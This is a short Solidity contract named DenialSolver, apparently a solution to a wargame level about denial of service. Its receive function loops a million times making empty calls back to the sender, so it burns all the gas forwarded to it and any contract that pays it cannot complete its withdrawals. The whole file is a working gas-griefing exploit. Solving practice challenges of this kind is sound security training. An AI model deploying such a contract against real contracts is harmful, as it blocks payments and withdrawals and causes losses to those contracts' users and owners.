// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialSolver {
    receive() external payable {
        for (uint i=0;i<1000000;i++){
            address(msg.sender).call{value:0}(""); //consume gas
        }
    }
}